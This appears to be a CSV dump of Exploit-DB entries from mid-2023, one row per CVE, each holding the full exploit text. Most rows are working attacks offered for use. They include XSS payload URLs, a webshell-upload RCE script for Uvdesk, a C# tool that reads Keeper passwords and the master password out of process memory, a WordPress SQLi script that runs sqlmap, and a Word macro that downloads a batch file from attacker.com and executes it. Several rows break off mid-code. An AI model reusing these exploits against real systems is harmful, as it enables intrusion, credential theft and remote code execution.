CVE-2023-33383,2023-08-04,exploit db,"#!/bin/bash # Exploit Title: Shelly PRO 4PM v0.11.0 - Authentication Bypass # Google Dork: NA # Date: 2nd August 2023 # Exploit Author: The Security Team [exploitsecurity.io] # Exploit Blog: https://www.exploitsecurity.io/post/cve-2023-33383-authentication-bypass-via-an-out-of-bounds-read-vulnerability # Vendor Homepage: https://www.shelly.com/ # Software Link: NA # Version: Firmware v0.11.0 (REQUIRED) # Tested on: MacOS/Linux # CVE : CVE-2023-33383 IFS= failed=$false RED=""\e[31m"" GREEN=""\e[92m"" WHITE=""\e[97m"" ENDCOLOR=""\e[0m"" substring=""Connection refused"" banner() clear echo -e ""${GREEN}[+]*********************************************************[+]"" echo -e ""${GREEN}| Author : Security Team [${RED}exploitsecurity.io${ENDCOLOR}] |"" echo -e ""${GREEN}| Description: Shelly PRO 4PM - Out of Bounds |"" echo -e ""${GREEN}| CVE: CVE-2023-33383 |"" echo -e ""${GREEN}[+]*********************************************************[+]"" echo -e ""${GREEN}[Enter key to send payload]${ENDCOLOR}"" banner read -s -n 1 key if [ ""$key"" = ""x"" ]; then exit 0; elif [ ""$key"" = """" ]; then gattout=$(sudo timeout 5 gatttool -b c8:f0:9e:88:92:3e --primary) if [ -z ""$gattout"" ]; then echo -e ""${RED}Connection timed out${ENDCOLOR}"" exit 0; else sudo gatttool -b c8:f0:9e:88:92:3e --char-write-req -a 0x000d -n 00000001 >/dev/null 2>&1 echo -ne ""${GREEN}[Sending Payload]${ENDCOLOR}"" sleep 1 if [ $? -eq 1 ]; then $failed=$true exit 0; fi sudo gatttool -b c8:f0:9e:88:92:3e --char-write-req -a 0x0008 -n ab >/dev/null 2>&1 sleep 1 if [ $? -eq 1 ]; then $failed=$true echo -e ""${RED}[**Exploit Failed**]${ENDCOLOR}"" exit 0; else sudo gatttool -b c8:f0:9e:88:92:3e --char-write-req -a 0x0008 -n abcd >/dev/null 2>&1 sleep 1 for i in {1..5} do echo -ne ""${GREEN}."" sleep 1 done echo -e ""\n${WHITE}[Pwned!]${ENDCOLOR}"" fi fi fi"
CVE-2023-36306,2023-08-04,exploit db,"# Exploit Title: Adiscon LogAnalyzer v.4.1.13 - Cross Site Scripting # Date: 2023.Aug.01 # Exploit Author: Pedro (ISSDU TW) # Vendor Homepage: https://loganalyzer.adiscon.com/ # Software Link: https://loganalyzer.adiscon.com/download/ # Version: v4.1.13 and before # Tested on: Linux # CVE : CVE-2023-36306 There are several installation method. If you installed without database(File-Based),No need to login. If you installed with database, You should login with Read Only User(at least) XSS Payloads are as below: XSS http://[ip address]/loganalyzer/asktheoracle.php?type=domain&query=&uid=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E http://[ip address]/loganalyzer/chartgenerator.php?type=2&byfield=syslogseverity&width=400&%%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E=123 http://[ip address]/loganalyzer/details.php/%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E http://[ip address]/loganalyzer/index.php/%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E http://[ip address]/loganalyzer/search.php/%22%3E%3Cscript%3Ealert('xss')%3C/script%3E http://[ip address]/loganalyzer/export.php/%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E http://[ip address]/loganalyzer/reports.php/%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E http://[ip address]/loganalyzer/statistics.php/%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E"
CVE-2023-37979,2023-08-04,exploit db,"# Exploit Title: WordPress Plugin Ninja Forms 3.6.25 - Reflected XSS (Authenticated) # Google Dork: inurl:/wp-content/plugins/ninja-forms/readme.txt # Date: 2023-07-27 # Exploit Author: Mehran Seifalinia # Vendor Homepage: https://ninjaforms.com/ # Software Link: https://downloads.wordpress.org/plugin/ninja-forms.3.6.25.zip # Version: 3.6.25 # Tested on: Windows 10 # CVE: CVE-2023-37979 from requests import get from sys import argv from os import getcwd import webbrowser from time import sleep # Values: url = argv[-1] if url[-1] == ""/"": url = url.rstrip(""/"") # Constants CVE_NAME = ""CVE-2023-37979"" VULNERABLE_VERSION = ""3.6.25"" # HTML template HTML_TEMPLATE = f"""""" {CVE_NAME} Ninja-forms reflected XSS ({CVE_NAME}) Created by Mehran Seifalinia "" /> After click on the button, If you received a 0 or received an empty page in browser , that means you need to login first. Github LinkedIn """""" def exploit(): with open(f""{CVE_NAME}.html"", ""w"") as"
CVE-2023-4112,2023-08-04,exploit db,"# Exploit Title: PHPJabbers Shuttle Booking Software 1.0 - Reflected XSS # Exploit Author: CraCkEr # Date: 20/07/2023 # Vendor: PHPJabbers # Vendor Homepage: https://www.phpjabbers.com/ # Software Link: https://www.phpjabbers.com/shuttle-booking-software/ # Version: 1.0 # Tested on: Windows 10 Pro # Impact: Manipulate the content of the site # CVE: CVE-2023-4112 ## Description The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials Path: /index.php URL parameter is vulnerable to RXSS https://website/index.php/gm5rj""> bwude?controller=pjAdmin&action=pjActionLogin&err=1"
CVE-2023-4113,2023-08-04,exploit db,"# Exploit Title: PHPJabbers Service Booking Script 1.0 - Reflected XSS # Exploit Author: CraCkEr # Date: 21/07/2023 # Vendor: PHPJabbers # Vendor Homepage: https://www.phpjabbers.com/ # Software Link: https://www.phpjabbers.com/service-booking-script/ # Version: 1.0 # Tested on: Windows 10 Pro # Impact: Manipulate the content of the site # CVE: CVE-2023-4113 ## Greetings The_PitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL , MoizSid09, indoushka CryptoJob (Twitter) twitter.com/0x0CryptoJob ## Description The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials Path: /index.php GET parameter 'index' is vulnerable to RXSS https://website/index.php?controller=pjFrontPublic&action=pjActionServices&locale=1&index=[XSS]"
CVE-2023-4114,2023-08-04,exploit db,"# Exploit Title: PHPJabbers Night Club Booking 1.0 - Reflected XSS # Exploit Author: CraCkEr # Date: 21/07/2023 # Vendor: PHPJabbers # Vendor Homepage: https://www.phpjabbers.com/ # Software Link: https://www.phpjabbers.com/night-club-booking-software/ # Version: 1.0 # Tested on: Windows 10 Pro # Impact: Manipulate the content of the site # CVE: CVE-2023-4114 ## Greetings The_PitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL , MoizSid09, indoushka CryptoJob (Twitter) twitter.com/0x0CryptoJob ## Description The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials Path: /index.php GET parameter 'index' is vulnerable to RXSS https://website/index.php?controller=pjFront&action=pjActionSearch&session_id=&locale=1&index=[XSS]&date="
CVE-2023-4115,2023-08-04,exploit db,"# Exploit Title: PHPJabbers Cleaning Business 1.0 - Reflected XSS # Exploit Author: CraCkEr # Date: 21/07/2023 # Vendor: PHPJabbers # Vendor Homepage: https://www.phpjabbers.com/ # Software Link: https://www.phpjabbers.com/cleaning-business-software/ # Version: 1.0 # Tested on: Windows 10 Pro # Impact: Manipulate the content of the site # CVE: CVE-2023-4115 ## Greetings The_PitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL , MoizSid09, indoushka CryptoJob (Twitter) twitter.com/0x0CryptoJob ## Description The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials Path: /index.php GET parameter 'index' is vulnerable to RXSS https://website/index.php?controller=pjFront&action=pjActionServices&locale=1&index=[XSS] [-] Done"
CVE-2023-4116,2023-08-04,exploit db,"# Exploit Title: PHPJabbers Taxi Booking 2.0 - Reflected XSS # Exploit Author: CraCkEr # Date: 22/07/2023 # Vendor: PHPJabbers # Vendor Homepage: https://www.phpjabbers.com/ # Software Link: https://www.phpjabbers.com/taxi-booking-script/ # Version: 2.0 # Tested on: Windows 10 Pro # Impact: Manipulate the content of the site # CVE: CVE-2023-4116 ## Greetings The_PitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL , MoizSid09, indoushka CryptoJob (Twitter) twitter.com/0x0CryptoJob ## Description The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials Path: /index.php GET parameter 'index' is vulnerable to RXSS https://website/index.php?controller=pjFrontPublic&action=pjActionSearch&locale=1&index=[XSS] [-] Done"
CVE-2023-4117,2023-08-04,exploit db,"# Exploit Title: PHPJabbers Rental Property Booking 2.0 - Reflected XSS # Exploit Author: CraCkEr # Date: 22/07/2023 # Vendor: PHPJabbers # Vendor Homepage: https://www.phpjabbers.com/ # Software Link: https://www.phpjabbers.com/rental-property-booking-calendar/ # Version: 2.0 # Tested on: Windows 10 Pro # Impact: Manipulate the content of the site # CVE: CVE-2023-4117 ## Greetings The_PitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL , MoizSid09, indoushka CryptoJob (Twitter) twitter.com/0x0CryptoJob ## Description The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials Path: /index.php GET parameter 'index' is vulnerable to RXSS https://website/index.php?controller=pjFront&action=pjActionSearch&session_id=&locale=1&index=[XSS]&date= [-] Done"
CVE-2023-4119,2023-08-04,exploit db,"# Exploit Title: Academy LMS 6.0 - Reflected XSS # Exploit Author: CraCkEr # Date: 22/07/2023 # Vendor: Creativeitem # Vendor Homepage: https://creativeitem.com/ # Software Link: https://demo.creativeitem.com/academy/ # Version: 6.0 # Tested on: Windows 10 Pro # Impact: Manipulate the content of the site # CVE: CVE-2023-4119 ## Greetings The_PitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL , MoizSid09, indoushka CryptoJob (Twitter) twitter.com/0x0CryptoJob ## Description The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials Path: /academy/home/courses GET parameter 'query' is vulnerable to XSS https://website/academy/home/courses?query=[XSS] Path: /academy/home/courses GET parameter 'sort_by' is vulnerable to XSS https://website/academy/home/courses?category=web-design&price=all&level=all&language=all&rating=all&sort_by=[XSS] XSS Payloads (Blocked) : ldt4d""> nuydd XSS Payload Bypass Filter : cplvz""> fk4ap [-] Done"
CVE-2023-39115,2023-08-04,exploit db,"# Exploit Title: Online Matrimonial Website System v3.3 - Code Execution via malicious SVG file upload # Date: 3-8-2023 # Category: Web Application # Exploit Author: Rajdip Dey Sarkar # Version: 3.3 # Tested on: Windows/Kali # CVE: CVE-2023-39115 Description: An arbitrary file upload vulnerability in Campcodes Online Matrimonial Website System Script v3.3 allows attackers to execute arbitrary code via uploading a crafted SVG file. SVG Payload ------------------ Steps to reproduce -Login with your creds -Navigate to this directory - /profile-settings -Click on Gallery -> Add New Image -> Browser -> Add Files -Choose the SVG file and upload done -Click the image!! Payload Triggered Burp Request POST /Matrimonial%20Script/install/aiz-uploader/upload HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate X-CSRF-TOKEN: I5gqfipOOKWwI74hfdtFC2kpUP0EggWb8Qf7Xd5E Content-Type: multipart/form-data; boundary=---------------------------167707198418121100152548123485 Content-Length: 1044 Origin: http://localhost Connection: close Referer: http://localhost/Matrimonial%20Script/install/gallery-image/create Cookie: _session=5GnMKaOhppEZivuzZJFXQLdldLMXecD1hmcEPWjg; acceptCookies=true; XSRF-TOKEN=I5gqfipOOKWwI74hfdtFC2kpUP0EggWb8Qf7Xd5E Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin -----------------------------167707198418121100152548123485 Content-Disposition: form-data; name=""relativePath"" null -----------------------------167707198418121100152548123485 Content-Disposition: form-data; name=""name"" file (1).svg -----------------------------167707198418121100152548123485 Content-Disposition: form-data; name=""type"" image/svg+xml -----------------------------167707198418121100152548123485 Content-Disposition: form-data; name=""aiz_file""; filename=""file (1).svg"" Content-Type: image/svg+xml -----------------------------167707198418121100152548123485--"
CVE-2023-2796,2023-08-04,exploit db,"# Exploit Title: Wordpress Plugin EventON Calendar 4.4 - Unauthenticated Event Access # Date: 03.08.2023 # Exploit Author: Miguel Santareno # Vendor Homepage: https://www.myeventon.com/ # Version: 4.4 # Tested on: Google and Firefox latest version # CVE : CVE-2023-2796 # 1. Description The plugin lacks authentication and authorization in its eventon_ics_download ajax action, allowing unauthenticated visitors to access private and password protected Events by guessing their numeric id. # 2. Proof of Concept ("
CVE-2023-3219,2023-08-04,exploit db,"# Exploit Title: Wordpress Plugin EventON Calendar 4.4 - Unauthenticated Post Access via IDOR # Date: 03.08.2023 # Exploit Author: Miguel Santareno # Vendor Homepage: https://www.myeventon.com/ # Version: 4.4 # Tested on: Google and Firefox latest version # CVE : CVE-2023-3219 # 1. Description The plugin does not validate that the event_id parameter in its eventon_ics_download ajax action is a valid Event, allowing unauthenticated visitors to access any Post (including unpublished or protected posts) content via the ics export functionality by providing the numeric id of the post. # 2. Proof of Concept ("
CVE-2023-39147,2023-07-31,exploit db,"# Exploit Title: Uvdesk v1.1.3 - File Upload Remote Code Execution (RCE) (Authenticated) # Date: 28/07/2023 # Exploit Author: Daniel Barros (@cupc4k3d) - Hakai Offensive Security # Vendor Homepage: https://www.uvdesk.com # Software Link: https://github.com/uvdesk/community-skeleton # Version: 1.1.3 # Example: python3 CVE-2023-39147.py -u ""http://$ip:8000/"" -c ""whoami"" # CVE : CVE-2023-39147 # Tested on: Ubuntu 20.04.6 import requests import argparse def get_args(): parser = argparse.ArgumentParser() parser.add_argument('-u', '--url', required=True, action='store', help='Target url') parser.add_argument('-c', '--command', required=True, action='store', help='Command to execute') my_args = parser.parse_args() return my_args def main(): args = get_args() base_url = args.url command = args.command uploaded_file = ""shell.php"" url_cmd = base_url + ""//assets/knowledgebase/shell.php?cmd="" + command # Edit your credentials here login_data = { ""_username"": ""admin@adm.com"", ""_password"": ""passwd"", ""_remember_me"": ""off"" files = { ""name"": (None, ""pwn""), ""description"": (None, ""xxt""), ""visibility"": (None, ""public""), ""solutionImage"": (uploaded_file, "" "", ""image/jpg"") s = requests.session() # Login s.post(base_url + ""/en/member/login"", data=login_data) # Upload upload_response = s.post(base_url + ""/en/member/knowledgebase/folders/new"", files=files) # Execute command cmd = s.get(url_cmd) print(cmd.text) if __name__ == ""__main__"": main()"
CVE-2023-36266,2023-07-28,exploit db,"# Exploit Title: Keeper Security desktop 16.10.2 & Browser Extension 16.5.4 - Password Dumping # Google Dork: NA # Date: 22-07-2023 # Exploit Author: H4rk3nz0 # Vendor Homepage: https://www.keepersecurity.com/en_GB/ # Software Link: https://www.keepersecurity.com/en_GB/get-keeper.html # Version: Desktop App version 16.10.2 & Browser Extension version 16.5.4 # Tested on: Windows # CVE : CVE-2023-36266 using System; using System.Management; using System.Diagnostics; using System.Linq; using System.Runtime.InteropServices; using System.Text; using System.Text.RegularExpressions; using System.Collections.Generic; static class Program public static string GetCommandLine(this Process process) if (process is null || process.Id < 1) return """"; string query = $@""SELECT CommandLine FROM Win32_Process WHERE ProcessId = {process.Id}""; using (var searcher = new ManagementObjectSearcher(query)) using (var collection = searcher.Get()) var managementObject = collection.OfType ().FirstOrDefault(); return managementObject != null ? (string)managementObject[""CommandLine""] : """"; public static void extract_credentials(string text) int index = text.IndexOf(""{\""title\"":\""""); int eindex = text.IndexOf(""}""); while (index >= 0) try int endIndex = Math.Min(index + eindex, text.Length); Regex reg = new Regex(""(\\{\\\""title\\\""[ -~]+\\}(?=\\s))""); string match = reg.Match(text.Substring(index - 1, endIndex - index)).ToString(); int match_cut = match.IndexOf(""} ""); if (match_cut != -1 ) match = match.Substring(0, match_cut + ""} "".Length).TrimEnd(); if (!stringsList.Contains(match) && match.Length > 20) Console.WriteLine(""->Credential Record Found : "" + match.Substring(0, match_cut + ""} "".Length) + ""\n""); stringsList.Add(match); } else if (!stringsList.Contains(match.TrimEnd()) && match.Length > 20) Console.WriteLine(""->Credential Record Found : "" + match + ""\n""); stringsList.Add(match.TrimEnd()); index = text.IndexOf(""{\""title\"":\"""", index + 1); eindex = text.IndexOf(""}"", eindex + 1); catch return; public static void extract_account(string text) int index = text.IndexOf(""{\""expiry\""""); int eindex = text.IndexOf(""}""); while (index >= 0) try int endIndex = Math.Min(index + eindex, text.Length); Regex reg = new Regex(""(\\{\\\""expiry\\\""[ -~]+@[ -~]+(?=\\}).)""); string match = reg.Match(text.Substring(index - 1, endIndex - index)).ToString(); if ((match.Length > 2)) Console.WriteLine(""->Account Record Found : "" + match + ""\n""); return; index = text.IndexOf(""{\""expiry\"""", index + 1); eindex = text.IndexOf(""}"", eindex + 1); catch return; public static void extract_master(string text) int index = text.IndexOf(""data_key""); int eindex = index + 64; while (index >= 0) try int endIndex = Math.Min(index + eindex, text.Length); Regex reg = new Regex(""(data_key[ -~]+)""); var match_one = reg.Match(text.Substring(index - 1, endIndex - index)).ToString(); Regex clean = new Regex(""(_[a-zA-z]{1,14}_[a-zA-Z]{1,10})""); if (match_one.Replace(""data_key"", """").Length > 5) if (!clean.IsMatch(match_one.Replace(""data_key"", """"))) Console.WriteLine(""->Master Password : "" + match_one.Replace(""data_key"", """") + ""\n""); index = text.IndexOf(""data_key"", index + 1); eindex = index + 64; catch return; public static List stringsList = new List (); static void Main(string[] args) foreach (var process in Process.GetProcessesByName(""keeperpasswordmanager"")) string commandline = GetCommandLine(process); if (commandline.Contains(""--renderer-client-id=5"") || commandline.Contains(""--renderer-client-id=7"")) Console.WriteLine(""->Keeper Target PID Found: {0}"", process.Id.ToString()); Console.WriteLine(""->Searching...\n""); IntPtr processHandle = OpenProcess(0x00000400 | 0x00000010, false, process.Id); IntPtr address = new IntPtr(0x10000000000); MEMORY_BASIC_INFORMATION memInfo = new MEMORY_BASIC_INFORMATION(); while (VirtualQueryEx(processHandle, address, out memInfo, (uint)Marshal.SizeOf(memInfo)) != 0) if (memInfo.State == 0x00001000 && memInfo.Type == 0x20000) byte[] buffer = new byte[(int)memInfo.RegionSize]; if (NtReadVirtualMemory(processHandle, memInfo.BaseAddress, buffer, (uint)memInfo.RegionSize, IntPtr.Zero) == 0x0) string text = Encoding.ASCII.GetString(buffer); extract_credentials(text); extract_master(text); extract_account(text); address = new IntPtr(memInfo.BaseAddress.ToInt64() + memInfo.RegionSize.ToInt64()); CloseHandle(processHandle); [DllImport(""kernel32.dll"")] public static extern IntPtr OpenProcess(uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, int dwProcessId); [DllImport(""kernel32.dll"")] public static extern bool CloseHandle(IntPtr hObject); [DllImport(""ntdll.dll"")] public static extern uint NtReadVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, UInt32 NumberOfBytesToRead, IntPtr NumberOfBytesRead); [DllImport(""kernel32.dll"", SetLastError = true)] public static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength); [StructLayout(LayoutKind.Sequential)] public struct MEMORY_BASIC_INFORMATION public IntPtr BaseAddress; public IntPtr AllocationBase; public uint AllocationProtect; public IntPtr RegionSize; public uint State; public uint Protect; public uint Type;"
CVE-2023-34634,2023-07-28,exploit db,"﻿# Exploit Title: GreenShot 1.2.10 - Insecure Deserialization Arbitrary Code Execution # Date: 26/07/2023 # Exploit Author: p4r4bellum # Vendor Homepage: https://getgreenshot.org # Software Link: https://getgreenshot.org/downloads/ # Version: 1.2.6.10 # Tested on: windows 10.0.19045 N/A build 19045 # CVE : CVE-2023-34634 # GreenShot 1.2.10 and below is vulnerable to an insecure object deserialization in its custom *.greenshot format # A stream of .Net object is serialized and inscureley deserialized when a *.greenshot file is open with the software # On a default install the *.greenshot file extension is associated with the programm, so double-click on a*.greenshot file # will lead to arbitrary code execution # Generate the payload. You need yserial.net to be installed on your machine. Grab it at https://github.com/pwntester/ysoserial.net ./ysoserial.exe -f BinaryFormatter -g WindowsIdentity -c ""calc"" --outputpath payload.bin -o raw #load the payload $payload = Get-Content .\payload.bin -Encoding Byte # retrieve the length of the payload $length = $payload.Length # load the required assembly to craft a PNG file Add-Type -AssemblyName System.Drawing # the following lines creates a png file with some text. Code borrowed from https://stackoverflow.com/questions/2067920/can-i-draw-create-an-image-with-a-given-text-with-powershell $filename = ""$home\"
CVE-2023-29918,2023-07-28,exploit db,"# Exploit Title: RosarioSIS 10.8.4 - CSV Injection # Google Dork:NA # Exploit Author: Ranjeet Jaiswal# # Vendor Homepage: https://www.rosariosis.org/ # Software Link: https://gitlab.com/francoisjacquet/rosariosis/-/archive/v10.8.4/rosariosis-v10.8.4.zip # Affected Version: 10.8.4 # Category: WebApps # Tested on: Windows 10 # 1. Vendor Description: # RosarioSIS has been designed to address the most important needs of administrators, teachers, support staff, parents, students, and clerical personnel. However, it also adds many components not typically found in Student Information Systems. # 2. Technical Description: # A CSV Injection (also known as Formula Injection) vulnerability in the RosarioSIS web application with version 10.8.4 allows malicious users to execute malicious payload in csv/xls and redirect authorized user to malicious website. # 3. Proof Of Concept: 3.1. Proof of Concept for CSV injection. # #Step to reproduce. Step1:Login in to RosarioSIS 10.8.4 Step2:Go to Periods page Step3:Add CSV injection redirection payload such as ""=HYPERLINK(""https://www.google.com"",""imp"")""in the Title field Step4:click on Save button to save data. Step5:Go to export tab and export the data Step6:When user open download Periods.xls file.You will see redirection hyperlink. Step7:When user click on link ,User will be redirected to Attacker or malicious website. # 4. Solution: Upgrade to latest release of RosarioSIS."
CVE-2023-3849,2023-07-28,exploit db,"# Exploit Title: mooDating 1.2 - Reflected Cross-site scripting (XSS) # Exploit Author: CraCkEr aka (skalvin) # Date: 22/07/2023 # Vendor: mooSocial # Vendor Homepage: https://moodatingscript.com/ # Software Link: https://demo.moodatingscript.com/home # Version: 1.2 # Tested on: Windows 10 Pro # Impact: Manipulate the content of the site # CVE: CVE-2023-3849, CVE-2023-3848, CVE-2023-3847, CVE-2023-3846, CVE-2023-3843, CVE-2023-3845, CVE-2023-3844 ## Greetings The_PitBull, Raz0r, iNs, SadsouL, His0k4, Hussin X, Mr. SQL , MoizSid09, indoushka CryptoJob (Twitter) twitter.com/0x0CryptoJob ## Description The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials Path: /matchmakings/question URL parameter is vulnerable to RXSS https://website/matchmakings/questiontmili%22%3e%3cimg%20src%3da%20onerror%3dalert(1)%3ew71ch?number= https://website/matchmakings/question[XSS]?number= Path: /friends URL parameter is vulnerable to RXSS https://website/friendsslty3%22%3e%3cimg%20src%3da%20onerror%3dalert(1)%3er5c3m/ajax_invite?mode=model https://website/friends[XSS]/ajax_invite?mode=model Path: /friends/ajax_invite URL parameter is vulnerable to RXSS https://website/friends/ajax_invitej7hrg%22%3e%3cimg%20src%3da%20onerror%3dalert(1)%3ef26v4?mode=model https://website/friends/ajax_invite[XSS]?mode=model Path: /pages URL parameter is vulnerable to RXSS https://website/pagesi3efi%22%3e%3cimg%20src%3da%20onerror%3dalert(1)%3ebdk84/no-permission-role?access_token&=redirect_url=aHR0cHM6Ly9kZW1vLm1vb2RhdGluZ3NjcmlwdC5jb20vbWVldF9tZS9pbmRleC9tZWV0X21l https://website/pages[XSS]/no-permission-role?access_token&=redirect_url=aHR0cHM6Ly9kZW1vLm1vb2RhdGluZ3NjcmlwdC5jb20vbWVldF9tZS9pbmRleC9tZWV0X21l Path: /users URL parameter is vulnerable to RXSS https://website/userszzjpp%22%3e%3cimg%20src%3da%20onerror%3dalert(1)%3eaycfc/view/108?tab=activity https://website/user[XSS]/view/108?tab=activity Path: /users/view URL parameter is vulnerable to RXSS https://website/users/viewi1omd%22%3e%3cimg%20src%3da%20onerror%3dalert(1)%3el43yn/108?tab=activity https://website/users/view[XSS]/108?tab=activity Path: /find-a-match URL parameter is vulnerable to RXSS https://website/find-a-matchpksyk%22%3e%3cimg%20src%3da%20onerror%3dalert(1)%3es9a64?session_popularity=&interest=0&show_search_form=1&gender=2&from_age=18&to_age=45&country_id=1&state_id=5&city_id=&advanced=0 https://website/find-a-match[XSS]?session_popularity=&interest=0&show_search_form=1&gender=2&from_age=18&to_age=45&country_id=1&state_id=5&city_id=&advanced=0 [XSS Payload]: pksyk""> s9a6 [-] Done"
CVE-2023-2636,2023-07-28,exploit db,"#!/usr/bin/python3 # Exploit Title: WordPress Plugin AN_Gradebook <= 5.0.1 - Subscriber+ SQLi # Date: 2023-07-26 # Exploit Author: Lukas Kinneberg # Github: https://github.com/lukinneberg/CVE-2023-2636 # Vendor Homepage: https://wordpress.org/plugins/an-gradebook/ # Software Link: https://github.com/lukinneberg/CVE-2023-2636/blob/main/an-gradebook.7z # Tested on: WordPress 6.2.2 # CVE: CVE-2023-2636 from datetime import datetime import os import requests import json # User Input: target_ip = 'CHANGE_THIS' target_port = '80' username = 'hacker' password = 'hacker' banner = ''' ||C |||V |||E |||- |||2 |||0 |||2 |||3 |||- |||2 |||6 |||3 |||6 || Exploit Author: Lukas Kinneberg print(banner) print('[*] Starting Exploit at: ' + str(datetime.now().strftime('%H:%M:%S'))) # Authentication: session = requests.Session() auth_url = 'http://' + target_ip + ':' + target_port + '/wp-login.php' check = session.get(auth_url) # Header: header = { 'Host': target_ip, 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'de,en-US;q=0.7,en;q=0.3', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'http://' + target_ip, 'Connection': 'close', 'Upgrade-Insecure-Requests': '1' # Body: body = { 'log': username, 'pwd': password, 'wp-submit': 'Log In', 'testcookie': '1' auth = session.post(auth_url, headers=header, data=body) # SQL-Injection (Exploit): # Generate payload for sqlmap cookies_session = session.cookies.get_dict() cookie = json.dumps(cookies_session) cookie = cookie.replace('""}','') cookie = cookie.replace('{""', '') cookie = cookie.replace('""', '') cookie = cookie.replace("" "", '') cookie = cookie.replace("":"", '=') cookie = cookie.replace(',', '; ') print('[*] Payload for SQL-Injection:') # Enter the URL path of the course after the target_port below exploitcode_url = r'sqlmap -u ""http://' + target_ip + ':' + target_port + r'/wp-admin/admin-ajax.php?action=course&id=3"" ' exploitcode_risk = '--level 2 --risk 2 ' exploitcode_cookie = '--cookie=""' + cookie + '"" ' # SQLMAP Printout print(' Sqlmap options:') print(' -a, --all Retrieve everything') print(' -b, --banner Retrieve DBMS banner') print(' --current-user Retrieve DBMS current user') print(' --current-db Retrieve DBMS current database') print(' --passwords Enumerate DBMS users password hashes') print(' --tables Enumerate DBMS database tables') print(' --columns Enumerate DBMS database table column') print(' --schema Enumerate DBMS schema') print(' --dump Dump DBMS database table entries') print(' --dump-all Dump all DBMS databases tables entries') retrieve_mode = input('Which sqlmap option should be used to retrieve your information? ') exploitcode = exploitcode_url + exploitcode_risk + exploitcode_cookie + retrieve_mode + ' -p id -v 0 --answers=""follow=Y"" --batch' os.system(exploitcode) print('Exploit finished at: ' + str(datetime.now().strftime('%H:%M:%S')))"
CVE-2023-38501,2023-07-28,exploit db,# Exploit Title: copyparty v1.8.6 - Reflected Cross Site Scripting (XSS) # Date: 23/07/2023 # Exploit Author: Vartamtezidis Theodoros (@TheHackyDog) # Vendor Homepage: https://github.com/9001/copyparty/ # Software Link: https://github.com/9001/copyparty/releases/tag/v1.8.6 # Version: <=1.8.6 # Tested on: Debian Linux # CVE : CVE-2023-38501 #Description Copyparty is a portable file server. Versions prior to 1.8.6 are subject to a reflected cross-site scripting (XSS) Attack. Vulnerability that exists in the web interface of the application could allow an attacker to execute malicious javascript code by tricking users into accessing a malicious link.
CVE-2023-33148,2023-07-20,exploit db,"## Title: Microsoft Office 365 Version 18.2305.1222.0 - Elevation of Privilege + RCE. ## Author: nu11secur1ty ## Date: 07.18.2023 ## Vendor: https://www.microsoft.com/ ## Software: https://www.microsoft.com/en-us/microsoft-365/microsoft-office ## Reference: https://portswigger.net/web-security/access-control ## CVE-2023-33148 ## Description: The Microsoft Office 365 Version 18.2305.1222.0 app is vulnerable to Elevation of Privilege. The attacker can use this vulnerability to attach a very malicious WORD file in the Outlook app which is a part of Microsoft Office 365 and easily can trick the victim to click on it - opening it and executing a very dangerous shell command, in the background of the local PC. This execution is without downloading this malicious file, and this is a potential problem and a very dangerous case! This can be the end of the victim's PC, it depends on the scenario. ## Staus: HIGH Vulnerability [+]Exploit: - Exploit Server: ```vb Sub AutoOpen() Call Shell(""cmd.exe /S /c"" & ""curl -s https://attacker.com/uqev/namaikitiputkata/golemui.bat > salaries.bat && .\salaries.bat"", vbNormalFocus) End Sub ## Reproduce: [href](https://github.com/nu11secur1ty/Windows11Exploits/tree/main/2023/CVE-2023-33148) ## Proof and Exploit [href](https://www.nu11secur1ty.com/2023/07/cve-2023-33148.html) ## Time spend: 00:35:00"
